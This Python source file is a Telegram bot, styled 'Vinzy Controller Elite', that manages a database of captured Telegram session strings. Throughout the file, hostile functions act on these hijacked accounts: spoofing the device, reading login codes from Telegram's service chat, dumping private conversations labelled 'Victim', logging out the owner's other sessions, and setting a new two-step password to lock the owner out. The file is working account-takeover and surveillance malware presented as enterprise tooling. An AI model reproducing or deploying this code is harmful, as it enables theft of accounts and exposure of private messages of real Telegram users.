# =========================================================================
# PROJECT: VINZY CONTROLLER ELITE (V4.5 - THE ULTIMATE OVERSEER)
# AUTHOR: VINZY DIGITAL SERVICES
# DESCRIPTION: ENTERPRISE-GRADE TELEGRAM SESSION MANAGEMENT & CONTROL
# PLATFORM: PYTHON 3.10+ | TELETHON | PYTELEGRAMBOTAPI | NEON POSTGRES
# =========================================================================

import os
import time
import asyncio
import logging
import psycopg2
import sys
import telebot
import random
from telebot import types
from telethon import TelegramClient, functions, types as tl_types, errors
from telethon.sessions import StringSession
from datetime import datetime

# --- 1. ADVANCED LOGGING INFRASTRUCTURE ---
# Optimized for cloud deployment (Koyeb/Heroku/Railway)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - [%(levelname)s] - %(name)s: %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("VinzyElite")

# --- 2. GLOBAL CONFIGURATION & CREDENTIALS ---
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")

# Group ID validation to prevent unauthorized bot usage
try:
    GROUP_ID = int(os.environ.get("GROUP_ID", "0"))
except (ValueError, TypeError):
    logger.error("GROUP_ID is missing. The bot will not respond to commands.")
    GROUP_ID = 0

if not BOT_TOKEN or not DATABASE_URL:
    logger.critical("FATAL: Environment variables BOT_TOKEN or DATABASE_URL are missing.")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# --- 3. PERSISTENT STORAGE LAYER (POSTGRESQL) ---

class VaultManager:
    """Handles high-performance database operations for session storage."""
    
    @staticmethod
    def get_connection():
        """Returns a secure connection to the Neon database."""
        try:
            return psycopg2.connect(DATABASE_URL, sslmode='require')
        except Exception as e:
            logger.error(f"Database Connection Failed: {e}")
            return None

    @classmethod
    def initialize_db(cls):
        """Ensures the vault table exists with the correct schema."""
        conn = cls.get_connection()
        if conn:
            try:
                cur = conn.cursor()
                cur.execute('''
                    CREATE TABLE IF NOT EXISTS moonton_secure_vault (
                        phone TEXT PRIMARY KEY,
                        session_string TEXT NOT NULL,
                        ip_address TEXT,
                        device_info TEXT DEFAULT 'iPhone 15 Pro Max',
                        capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
                    );
                ''')
                conn.commit()
                cur.close()
                logger.info("Database initialized successfully.")
            except Exception as e:
                logger.error(f"Database Init Error: {e}")
            finally:
                conn.close()

    @classmethod
    def upsert_session(cls, phone, session_str):
        """Saves or updates a session string in the vault."""
        conn = cls.get_connection()
        if not conn: return False
        try:
            cur = conn.cursor()
            cur.execute("""
                INSERT INTO moonton_secure_vault (phone, session_string)
                VALUES (%s, %s)
                ON CONFLICT (phone) DO UPDATE SET session_string = EXCLUDED.session_string
            """, (phone, session_str))
            conn.commit()
            cur.close()
            return True
        except Exception as e:
            logger.error(f"Upsert Error: {e}")
            return False
        finally:
            conn.close()

    @classmethod
    def get_session(cls, phone):
        """Retrieves a session string from the vault."""
        conn = cls.get_connection()
        if not conn: return None
        try:
            cur = conn.cursor()
            cur.execute("SELECT session_string FROM moonton_secure_vault WHERE phone = %s", (phone,))
            res = cur.fetchone()
            cur.close()
            return res[0] if res else None
        finally:
            conn.close()

    @classmethod
    def list_all(cls):
        """Fetches all stored accounts for the .list command."""
        conn = cls.get_connection()
        if not conn: return []
        try:
            cur = conn.cursor()
            cur.execute("SELECT phone, capture_date FROM moonton_secure_vault ORDER BY capture_date DESC")
            data = cur.fetchall()
            cur.close()
            return data
        finally:
            conn.close()

# --- 4. ASYNC TASK ENGINE (TELETHON WRAPPER) ---

async def run_logic(phone, callback, *args):
    """
    Main execution wrapper for all Telethon-based commands.
    Handles connection, auth verification, and device spoofing.
    """
    session_str = VaultManager.get_session(phone)
    if not session_str:
        return f"❌ <b>Error:</b> Account <code>{phone}</code> is not in the vault."

    # Spoofing the latest hardware for maximum security/stealth
    client = TelegramClient(
        StringSession(session_str),
        API_ID, API_HASH,
        device_model="iPhone 15 Pro Max",
        system_version="17.4.1",
        app_version="10.10.1"
    )

    try:
        logger.info(f"Targeting Account: {phone}")
        await asyncio.wait_for(client.connect(), timeout=25)

        if not await client.is_user_authorized():
            return f"❌ <b>Failed:</b> Session for <code>{phone}</code> is dead/revoked."

        return await callback(client, *args)

    except asyncio.TimeoutError:
        return "⚠️ <b>Timeout:</b> Telegram server failed to respond in time."
    except errors.FloodWaitError as e:
        return f"⏳ <b>Flood:</b> Please wait {e.seconds} seconds."
    except Exception as e:
        logger.error(f"Task Failure: {e}")
        return f"⚠️ <b>System Error:</b> {str(e)}"
    finally:
        await client.disconnect()

# --- 5. FUNCTIONAL LOGIC MODULES ---

async def logic_auth_manual(session_str):
    """Verifies a raw session string and saves it if valid."""
    client = TelegramClient(StringSession(session_str), API_ID, API_HASH, device_model="iPhone 15 Pro Max")
    try:
        await client.connect()
        if not await client.is_user_authorized():
            return "❌ <b>Rejected:</b> The provided session string is invalid."
        
        me = await client.get_me()
        if not me.phone:
            return "❌ <b>Incomplete:</b> Session valid, but phone number is hidden."
        
        if VaultManager.upsert_session(me.phone, session_str):
            return (
                f"✅ <b>Manual Auth Success!</b>\n"
                f"━━━━━━━━━━━━━━━\n"
                f"📱 <b>Phone:</b> <code>{me.phone}</code>\n"
                f"👤 <b>Name:</b> {me.first_name}\n"
                f"🆔 <b>UID:</b> <code>{me.id}</code>\n"
                f"━━━━━━━━━━━━━━━"
            )
        return "❌ <b>DB Error:</b> Could not save session to vault."
    finally:
        await client.disconnect()

async def logic_get_info(client):
    """Pulls full metadata and account status."""
    me = await client.get_me()
    return (
        f"📊 <b>Full Account Intel</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 <b>Name:</b> {me.first_name} {me.last_name or ''}\n"
        f"📱 <b>Phone:</b> +{me.phone}\n"
        f"🆔 <b>User ID:</b> <code>{me.id}</code>\n"
        f"💎 <b>Premium:</b> {'Yes' if me.premium else 'No'}\n"
        f"🛡️ <b>Scam/Fake:</b> {'Yes' if me.scam or me.fake else 'No'}\n"
        f"━━━━━━━━━━━━━━━"
    )

async def logic_check_2fa(client):
    """Checks for the presence of a cloud password."""
    try:
        res = await client(functions.account.GetPasswordRequest())
        if res.has_password:
            return f"🔐 <b>2FA ENABLED:</b> Hint: <code>{res.hint or 'None'}</code>"
        return "🔓 <b>2FA DISABLED:</b> Account is vulnerable."
    except Exception as e:
        return f"⚠️ Error: {str(e)}"

async def logic_kick_all(client):
    """Forces all other sessions to log out."""
    await client(functions.auth.ResetAuthorizationsRequest())
    return "⚡ <b>Success:</b> All other active sessions have been wiped."

async def logic_get_code(client):
    """Pulls the latest service message from Telegram (Login Codes)."""
    async for msg in client.iter_messages(777000, limit=1):
        if msg.text:
            return f"📟 <b>Latest System Message:</b>\n\n<code>{msg.text}</code>"
    return "📭 <b>Inbox Empty:</b> No codes found."

async def logic_list_chats(client, limit):
    """Retrieves a list of recent chats with their IDs."""
    output = f"💬 <b>Recent {limit} Chats:</b>\n\n"
    async for d in client.iter_dialogs(limit=limit):
        icon = "👤" if d.is_user else "👥"
        output += f"{icon} <code>{d.id}</code> | <b>{d.name}</b>\n"
    return output

async def logic_read_msgs(client, cid, limit):
    """Reads messages from a specific chat ID."""
    try:
        output = f"📩 <b>Chat Logs for {cid}:</b>\n\n"
        async for m in client.iter_messages(cid, limit=limit):
            who = "Victim" if m.out else "Partner"
            text = m.text[:50] + "..." if m.text and len(m.text) > 50 else (m.text or "[Media]")
            output += f"<b>{who}:</b> {text}\n"
        return output
    except Exception as e:
        return f"⚠️ Failed to read {cid}: {str(e)}"

# --- 6. TELEGRAM BOT HANDLERS ---

@bot.message_handler(commands=['start', 'help'])
def handle_help(m):
    if m.chat.id != GROUP_ID: return
    text = (
        "👑 <b>VINZY CONTROLLER ELITE V4.5</b>\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🔌 <b>ACCESS</b>\n"
        "• <code>.auth [session]</code> - Inject session string\n"
        "• <code>.list</code> - Show all captured accounts\n\n"
        "🛡️ <b>CONTROL</b>\n"
        "• <code>.info [phone]</code> - Full account report\n"
        "• <code>.lock [phone]</code> - Check 2FA status\n"
        "• <code>.wipe [phone]</code> - Terminate sessions\n"
        "• <code>.secure [phone] [pw]</code> - Set force 2FA\n\n"
        "🕵️ <b>DISCOVERY</b>\n"
        "• <code>.code [phone]</code> - Get login codes\n"
        "• <code>.chats [phone] [limit]</code> - List dialogs\n"
        "• <code>.dump [phone] [id] [limit]</code> - Read chat\n\n"
        "✍️ <b>MODS</b>\n"
        "• <code>.bio [phone] [text]</code> - Change bio\n"
        "• <code>.name [phone] [first] [last]</code> - Change name\n"
        "━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(m.chat.id, text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.auth'))
def cmd_auth(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ", 1)
    if len(args) < 2: return bot.reply_to(m, "❌ Usage: <code>.auth [string]</code>")
    bot.send_chat_action(m.chat.id, 'typing')
    res = asyncio.run(logic_auth_manual(args[1].strip()))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.list')
def cmd_list(m):
    if m.chat.id != GROUP_ID: return
    hits = VaultManager.list_all()
    if not hits: return bot.send_message(m.chat.id, "📭 Vault is empty.")
    msg = "📋 <b>Vaulted Hits:</b>\n\n"
    for p, d in hits:
        msg += f"📱 <code>{p}</code> | {d.strftime('%m/%d %H:%M')}\n"
    bot.send_message(m.chat.id, msg, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.info'))
def cmd_info(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 2: return bot.reply_to(m, "Usage: <code>.info [phone]</code>")
    res = asyncio.run(run_logic(args[1], logic_get_info))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.lock'))
def cmd_lock(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 2: return bot.reply_to(m, "Usage: <code>.lock [phone]</code>")
    res = asyncio.run(run_logic(args[1], logic_check_2fa))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.wipe'))
def cmd_wipe(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 2: return bot.reply_to(m, "Usage: <code>.wipe [phone]</code>")
    res = asyncio.run(run_logic(args[1], logic_kick_all))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.code'))
def cmd_code(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 2: return bot.reply_to(m, "Usage: <code>.code [phone]</code>")
    res = asyncio.run(run_logic(args[1], logic_get_code))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.chats'))
def cmd_chats(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 2: return bot.reply_to(m, "Usage: <code>.chats [phone] [limit]</code>")
    limit = int(args[2]) if len(args) > 2 else 15
    res = asyncio.run(run_logic(args[1], logic_list_chats, limit))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.dump'))
def cmd_dump(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(parts := m.text.split()) < 3: return bot.reply_to(m, "Usage: <code>.dump [phone] [id] [limit]</code>")
    phone, cid = parts[1], parts[2]
    limit = int(parts[3]) if len(parts) > 3 else 10
    res = asyncio.run(run_logic(phone, logic_read_msgs, cid, limit))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.bio'))
def cmd_bio(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ", 2)
    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.bio [phone] [text]</code>")
    async def bio_fn(c, t):
        await c(functions.account.UpdateProfileRequest(about=t))
        return "✅ Bio updated."
    res = asyncio.run(run_logic(parts[1], bio_fn, parts[2]))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.secure'))
def cmd_secure(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ")
    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.secure [phone] [pw]</code>")
    async def secure_fn(c, p):
        await c.edit_2fa(new_password=p)
        return f"✅ 2FA set to: <code>{p}</code>"
    res = asyncio.run(run_logic(parts[1], secure_fn, parts[2]))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.name'))
def cmd_name(m):
    if m.chat.id != GROUP_ID: return
    parts = m.text.split(" ", 3)
    if len(parts) < 3: return bot.reply_to(m, "Usage: <code>.name [phone] [first] [last]</code>")
    f, l = parts[2], parts[3] if len(parts) > 3 else ""
    async def name_fn(c, first, last):
        await c(functions.account.UpdateProfileRequest(first_name=first, last_name=last))
        return "✅ Name changed."
    res = asyncio.run(run_logic(parts[1], name_fn, f, l))
    bot.send_message(m.chat.id, res, parse_mode="HTML")

# --- 7. MAIN STARTUP SEQUENCE ---

def main():
    """Initializes system components and starts the listener."""
    print("""
    __     ___                  _____            _             _ _ 
    \ \   / (_)                / ____|          | |           | | |
     \ \_/ / _ _ __  _____   _| |     ___  _ __ | |_ _ __ ___ | | |
      \   / | | '_ \|_  / | | | |    / _ \| '_ \| __| '__/ _ \| | |
       | |  | | | | |/ /| |_| | |___| (_) | | | | |_| | | (_) | | |
       |_|  |_|_| |_/___|\__, |\_____\___/|_| |_|\__|_|  \___/|_|_|
                          __/ |                                    
                         |___/                                     
    """)
    VaultManager.initialize_db()
    logger.info("Vinzy Controller Elite v4.5 is online.")
    
    # Infinity polling with low timeout to ensure responsiveness on cloud hosts
    bot.infinity_polling(timeout=10, long_polling_timeout=5)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        logger.info("Shutting down...")
        sys.exit(0)
    except Exception as e:
        logger.critical(f"UNRECOVERABLE SYSTEM ERROR: {e}")
